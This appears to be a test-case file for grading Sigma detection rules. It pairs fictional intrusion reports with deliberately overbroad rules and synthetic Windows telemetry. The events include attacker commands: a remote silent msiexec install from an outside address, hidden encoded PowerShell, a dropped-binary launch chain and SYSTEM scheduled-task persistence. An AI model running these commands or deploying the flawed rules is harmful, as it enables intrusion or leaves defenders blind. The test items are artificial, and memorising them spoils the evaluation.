@@ -1,0 +1,461 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D7",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "cmd.exe /k cd /d C:\\Scripts",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "\"C:\\Windows\\System32\\cmd.exe\"",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "cmd.exe /c copy C:\\Users\\Public\\cache.dat C:\\ProgramData\\Crane\\svcupd.exe && start /b C:\\ProgramData\\Crane\\svcupd.exe",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n C:\\Users\\bob\\Downloads\\invoice_q3.docm",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "cmd.exe /c copy C:\\Users\\Public\\cache.dat C:\\ProgramData\\Crane\\svcupd.exe && start /b C:\\ProgramData\\Crane\\svcupd.exe",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n C:\\Users\\carol\\Downloads\\invoice_q3.docm",
+      "user": "LAB\\carol"
+     }
+    ]
+   },
+   "evidence": [
+    "cmd.exe /c copy C:\\Users\\Public\\cache.dat C:\\ProgramData\\Crane\\svcupd.exe && start /b C:\\ProgramData\\Crane\\svcupd.exe",
+    "the macro spawns a command interpreter and chains the staging steps through it"
+   ],
+   "expected_gate": "G11",
+   "id": "D7-01",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident Note CN-114, macro-enabled loader. The malicious attachment is a Word document named invoice_q3.docm. On open, the macro does not call PowerShell at all. Instead the macro spawns a command interpreter and chains the staging steps through it. Responders recovered the following invocation from process telemetry: cmd.exe /c copy C:\\Users\\Public\\cache.dat C:\\ProgramData\\Crane\\svcupd.exe && start /b C:\\ProgramData\\Crane\\svcupd.exe. The same pattern was seen on three hosts, always launched with the /c switch and a chained command, and always as a child of winword.exe. The dropped binary establishes persistence in a later stage that is covered in a separate note. Analysts assess that use of the Windows command shell as the first execution step is deliberate, because the group has avoided PowerShell in every intrusion since spring.",
+   "role": "defective",
+   "sigma_yaml": "title: Command Shell Executing a Command via cmd.exe /c\nid: 3f6c1d52-8a41-4b7e-9c2a-5d0e7b91a4c3\nstatus: experimental\ndescription: Detects the Windows command shell running a chained one-shot command, as used by a macro loader that avoids PowerShell.\nreferences:\n    - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'cmd.exe /c'\n    condition: selection\nfalsepositives:\n    - Administrative scripts and installers that run commands through cmd.exe\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.003"
+   ],
+   "why": "The rule's only term is CommandLine containing 'cmd.exe /c' (ten characters, so it looks discriminating) but this is the ordinary way to run a one-shot command; it matches the baseline's frequent benign 'cmd.exe /c ipconfig /all' and 'cmd.exe /c whoami' executions among the 31 cmd.exe launches, far above the 2-event limit."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D7",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell_ise.exe C:\\Scripts\\backup.ps1",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "pwsh.exe -NoProfile -File C:\\Scripts\\report.ps1",
+      "image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\svchost.exe",
+      "parent_cmd": "svchost.exe -k netsvcs -p -s Schedule",
+      "user": "LAB\\svc-report"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ipconfig /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\todo.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe C:\\Users\\Public\\invoice_view.js",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABkACAAPQAgAEcAZQB0AC0ASABvAHMAdAA=",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe C:\\Users\\Public\\invoice_view.js",
+      "user": "LAB\\carol"
+     }
+    ]
+   },
+   "evidence": [
+    "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand",
+    "a hidden PowerShell session retrieves the second stage from a staging server"
+   ],
+   "expected_gate": "G11",
+   "id": "D7-02",
+   "logsource": "windows_process_creation",
+   "report_text": "Threat Brief TB-2207, CRANE-LOOM downloader stage. After the user opens the lure shortcut, a hidden PowerShell session retrieves the second stage from a staging server. Analysts observed the interpreter launched as powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand followed by a long Base64 string, spawned by wscript.exe rather than by an interactive shell. The decoded script builds a web client object, downloads a payload to the user profile and executes it in memory. The operators prefer the built-in Windows PowerShell host over third-party interpreters because it is present on every workstation in the victim environment. No script files were written to disk during this stage, so file-based detection did not trigger. The group is assessed to be financially motivated.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Host Process Started\nid: 7b2e94a0-1c5d-4f38-a6e9-0d83c2f5b717\nstatus: experimental\ndescription: Detects creation of the Windows PowerShell host process, the interpreter used by the downloader stage of the campaign.\nreferences:\n    - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\powershell.exe'\n    condition: selection\nfalsepositives:\n    - Administrative PowerShell scripts\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001"
+   ],
+   "why": "The only condition is Image ending in \\powershell.exe, which is a process name, so the rule has no discriminating term at all; the baseline holds 25 benign powershell.exe launches (6.25 percent of 400 events), including the backup.ps1 script run and the Get-Service command, all of which match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D7",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.80",
+      "dest_port": "8443",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.20",
+      "dest_port": "123",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.25",
+      "dest_port": "993",
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.50",
+      "dest_port": "443",
+      "image": "C:\\ProgramData\\CraneSync\\crsync.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.50",
+      "dest_port": "443",
+      "image": "C:\\ProgramData\\CraneSync\\crsync.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "C:\\ProgramData\\CraneSync\\crsync.exe",
+    "contacts its controller over TCP port 443 at a fixed interval of roughly ninety seconds"
+   ],
+   "expected_gate": "G11",
+   "id": "D7-03",
+   "logsource": "windows_network_connection",
+   "report_text": "Intrusion Summary IS-0931, beaconing implant. The implant is installed as C:\\ProgramData\\CraneSync\\crsync.exe and contacts its controller over TCP port 443 at a fixed interval of roughly ninety seconds. Traffic on this port blends in with ordinary HTTPS, and the controller address 203.0.113.50 was only recovered from memory. The implant opens a fresh connection for every beacon instead of keeping a session open, and its request headers copy the browser family used in the victim environment. Responders confirmed that the process crsync.exe made outbound connections to the controller from all five infected workstations. Network defenders should treat this as web-protocol command and control rather than as a data transfer tool, because the volume of each exchange is very small.",
+   "role": "defective",
+   "sigma_yaml": "title: Executable Making Outbound Connection on TCP 443\nid: c19a5e73-62bd-4d08-8f41-b3a7e0d29c65\nstatus: experimental\ndescription: Detects an executable making an outbound connection on TCP port 443, the web-protocol beacon channel used by the implant.\nreferences:\n    - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n    - attack.command_and_control\n    - attack.t1071.001\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '.exe'\n        DestinationPort: '443'\n    condition: selection\nfalsepositives:\n    - Any software that communicates over HTTPS\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.001"
+   ],
+   "why": "The rule has two conditions on two different fields, but both are near-universal: Image ending in '.exe' matches every Windows program and DestinationPort 443 is the dominant port of the 80 baseline connections from chrome.exe, msedge.exe, Teams, svchost.exe and OneDrive, so most baseline network connections match, far above the 2-event limit."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D7",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "a1b2c3.pkgmirror.test"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "dns_query",
+      "name": "fileserver.corp.example"
+     },
+     {
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "dns_query",
+      "name": "intranet.lab.invalid"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\Users\\dave\\AppData\\Roaming\\Crane\\dnsbeat.exe",
+      "kind": "dns_query",
+      "name": "a9f3k2.vexmoor-lattice.com"
+     },
+     {
+      "image": "C:\\Users\\dave\\AppData\\Roaming\\Crane\\dnsbeat.exe",
+      "kind": "dns_query",
+      "name": "m4t8ze.vexmoor-lattice.com"
+     }
+    ]
+   },
+   "evidence": [
+    "resolves a randomised label under a .com domain every few minutes",
+    "names of the form a9f3k2.vexmoor-lattice.com"
+   ],
+   "expected_gate": "G11",
+   "id": "D7-04",
+   "logsource": "windows_dns_query",
+   "report_text": "Campaign Report CR-55, DNS-based command and control. The implant, a small console executable named dnsbeat.exe, resolves a randomised label under a .com domain every few minutes and treats the answer as its tasking. Responders observed names of the form a9f3k2.vexmoor-lattice.com, with a new six-character label for each lookup. The implant uses the system resolver and does not contact any other service. No direct TCP connection to the operator was ever observed from the infected hosts, which is why network-flow monitoring found nothing. Analysts assess that the operator controls the authoritative name server for the domain and encodes commands in the responses. The same label length and character set were seen across all four victim organisations.",
+   "role": "defective",
+   "sigma_yaml": "title: DNS Query to a .com Domain\nid: 5e84d0b1-93a7-4c2f-b6d8-1f4a7c30e952\nstatus: experimental\ndescription: Detects DNS lookups for names under a .com domain, the transport used by the dnsbeat implant for command and control.\nreferences:\n    - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n    - attack.command_and_control\n    - attack.t1071.004\nlogsource:\n    category: dns_query\n    product: windows\ndetection:\n    selection:\n        QueryName|endswith: '.com'\n    condition: selection\nfalsepositives:\n    - Any host resolving a commercial domain\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.004"
+   ],
+   "why": "The only term is QueryName ending in '.com', which is four characters on a non-process field and so looks like a discriminating term, but '.com' is the suffix of six of the eight frequent baseline domains (login.microsoftonline.com, www.microsoft.com, mail.google.com, www.bing.com, onedrive.live.com, windowsupdate.microsoft.com), so most of the 60 baseline DNS queries match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D7",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "msiexec.exe /i C:\\Temp\\app.msi /passive",
+      "image": "C:\\Windows\\System32\\msiexec.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "WINWORD.EXE /n C:\\Users\\alice\\Documents\\report.docx",
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "msiexec.exe /i http://198.51.100.9/rmtsvc.msi /qn /norestart",
+      "image": "C:\\Windows\\System32\\msiexec.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "parent_cmd": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+      "user": "LAB\\svc-admin"
+     },
+     {
+      "cmd": "msiexec.exe /i http://198.51.100.9/rmtsvc.msi /qn /norestart",
+      "image": "C:\\Windows\\System32\\msiexec.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "parent_cmd": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+      "user": "LAB\\svc-admin"
+     }
+    ]
+   },
+   "evidence": [
+    "msiexec.exe /i http://198.51.100.9/rmtsvc.msi /qn /norestart",
+    "installs it silently so the user sees no prompt"
+   ],
+   "expected_gate": "G11",
+   "id": "D7-05",
+   "logsource": "windows_process_creation",
+   "report_text": "Analyst Note AN-318, remote access tool deployment. After obtaining administrator credentials, the operator pushes a legitimate remote administration package to the victim and installs it silently so the user sees no prompt. The installer is delivered as an MSI and executed as msiexec.exe /i http://198.51.100.9/rmtsvc.msi /qn /norestart from a remote management session. The tool then connects out to the operator's relay and gives interactive control of the desktop. Because the product is signed and commercially available, antivirus did not flag it. The same silent install pattern was used on two servers and one workstation, and the operator deleted the MSI from the staging server afterwards. The relay address was not recovered.",
+   "role": "defective",
+   "sigma_yaml": "title: Silent MSI Installation via msiexec\nid: a0d73f68-45e2-49b1-8c07-e69b2d1a3f84\nstatus: experimental\ndescription: Detects a silent MSI installation through msiexec, the method used to deploy a remote administration tool.\nreferences:\n    - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n    - attack.command_and_control\n    - attack.t1219\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msiexec.exe'\n        CommandLine|contains: '/qn'\n    condition: selection\nfalsepositives:\n    - Software deployment tools and administrators installing packages silently\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1219"
+   ],
+   "why": "Image msiexec.exe and CommandLine containing '/qn' look like two independent conditions, but both describe an ordinary silent install; the baseline's 9 benign 'msiexec.exe /i C:\\Temp\\app.msi /qn' executions (2.25 percent of 400 events) all match, above the 2-event ceiling, because the rule has no source URL, package name or other distinguishing term."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D7",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "schtasks /create /tn BackupNightly /sc daily /st 02:00 /tr C:\\Scripts\\backup.ps1",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-backup"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "whoami",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "schtasks /create /tn CraneSync /sc minute /mo 15 /tr C:\\ProgramData\\Crane\\sync.exe /ru SYSTEM",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c C:\\ProgramData\\Crane\\setup.bat",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "schtasks /create /tn CraneSync /sc minute /mo 15 /tr C:\\ProgramData\\Crane\\sync.exe /ru SYSTEM",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c C:\\ProgramData\\Crane\\setup.bat",
+      "user": "LAB\\carol"
+     }
+    ]
+   },
+   "evidence": [
+    "schtasks /create /tn CraneSync /sc minute /mo 15 /tr C:\\ProgramData\\Crane\\sync.exe /ru SYSTEM",
+    "the operators verified it by running schtasks /query /fo LIST and looking for the task name in the listing"
+   ],
+   "expected_gate": "G11",
+   "id": "D7-06",
+   "logsource": "windows_process_creation",
+   "report_text": "Persistence Brief PB-72, scheduled task abuse. After establishing a foothold the operators create a scheduled task named CraneSync so that the dropped binary re-launches every fifteen minutes. Responders recovered the creation command from process telemetry: schtasks /create /tn CraneSync /sc minute /mo 15 /tr C:\\ProgramData\\Crane\\sync.exe /ru SYSTEM. After creating the task, the operators verified it by running schtasks /query /fo LIST and looking for the task name in the listing. The task is created from a command shell and is not hidden from the Task Scheduler interface. The behaviour was identical on every compromised host, and cleanup consisted of deleting the task and the binary.",
+   "role": "defective",
+   "sigma_yaml": "title: Scheduled Task Creation and Verification via schtasks\nid: 91c4b2e5-7d30-4a96-bf18-4c05a8e7d6b2\nstatus: experimental\ndescription: Detects creation of the CraneSync scheduled task and the follow-up query the operators used to verify it.\nreferences:\n    - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1053.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_create:\n        CommandLine|contains|all:\n            - 'schtasks'\n            - '/create'\n            - 'CraneSync'\n    selection_verify:\n        CommandLine|contains: 'schtasks /query'\n    condition: selection_create or selection_verify\nfalsepositives:\n    - Administrators listing scheduled tasks\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1053.005"
+   ],
+   "why": "The selection_create branch is narrow (schtasks, /create and the task name CraneSync), but the selection_verify branch matches any command line containing 'schtasks /query'; the baseline has 13 schtasks.exe launches, including the frequent benign 'schtasks /query /fo LIST', i.e. over 3 percent of 400 events, above the 2-event ceiling."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D7",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.44",
+      "dest_port": "8080",
+      "image": "C:\\Windows\\System32\\curl.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.30",
+      "dest_port": "3389",
+      "image": "C:\\Windows\\System32\\mstsc.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.53",
+      "dest_port": "53",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "80",
+      "image": "C:\\Users\\erin\\AppData\\Local\\Temp\\updater.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "443",
+      "image": "C:\\Users\\erin\\AppData\\Local\\Temp\\updater.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "It fetches the payload from the operator's server at 203.0.113.77 over port 80 and falls back to port 443 if the first attempt is blocked",
+    "dropped as updater.exe in the user's temporary directory"
+   ],
+   "expected_gate": "G11",
+   "id": "D7-07",
+   "logsource": "windows_network_connection",
+   "report_text": "Malware Analysis Excerpt MA-409, downloader behaviour. The first-stage downloader is dropped as updater.exe in the user's temporary directory. It fetches the payload from the operator's server at 203.0.113.77 over port 80 and falls back to port 443 if the first attempt is blocked. The payload is written to disk under a random name and executed, which makes this an ingress tool transfer step rather than an exfiltration channel. The downloader performs no certificate validation and uses a hard-coded address instead of a domain, so DNS telemetry will not show the activity. Analysts recovered the address from a configuration block in memory. The downloader exits once the payload has been launched and is not seen again on the host.",
+   "role": "defective",
+   "sigma_yaml": "title: Outbound Connection on Port 80 or 443 from Payload Downloader\nid: e2f08a47-3b6c-4d15-9a72-86d1c5b0e3f9\nstatus: experimental\ndescription: Detects outbound connections on ports 80 and 443, the ports used by the first-stage downloader to fetch its payload.\nreferences:\n    - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n    - attack.command_and_control\n    - attack.t1105\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        DestinationPort:\n            - '80'\n            - '443'\n    condition: selection\nfalsepositives:\n    - Web browsers and other software using HTTP or HTTPS\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1105"
+   ],
+   "why": "The only condition is DestinationPort 80 or 443, with no process, address or other term; the baseline's 80 network connections are all on ports 443 and 80 (chrome, msedge, Teams, svchost, OneDrive), so every one of them, 20 percent of the 400 events, matches."
+  }
+ ]
+}
